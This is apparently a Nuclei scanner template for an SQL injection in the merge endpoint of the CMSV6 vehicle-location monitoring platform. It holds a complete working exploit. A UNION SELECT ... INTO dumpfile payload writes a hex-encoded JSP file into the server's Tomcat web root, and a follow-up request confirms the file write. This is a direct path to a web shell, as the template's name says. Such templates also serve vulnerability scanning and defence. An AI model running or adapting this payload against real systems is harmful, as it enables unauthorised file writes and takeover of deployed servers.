id: G-sky_CMSV6_merge_SQLi_GetShell

info:
  name: G-sky_CMSV6_merge_SQLi_GetShell
  author: HK
  severity: critical
  description: 通天星CMSV6车载定位监控平台/point_manage/merge接口存在SQL注入漏洞
  metadata:
    max-request: 2
    shodan-query: ""
    verified: true

http:
- raw:
  - |-
    @timeout: 30s
    POST /point_manage/merge HTTP/1.1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2882.93 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Host: {{Hostname}}
    Content-Length: 433

    id=1&name=1' UNION SELECT%0aNULL, 0x3c25206f75742e7072696e7428227465737422293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL INTO dumpfile '../../tomcat/webapps/gpsweb/test.jsp' FROM user_session a WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8
  - |+
    @timeout: 30s
    GET /test.jsp HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36


  max-redirects: 3
  cookie-reuse: true
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - test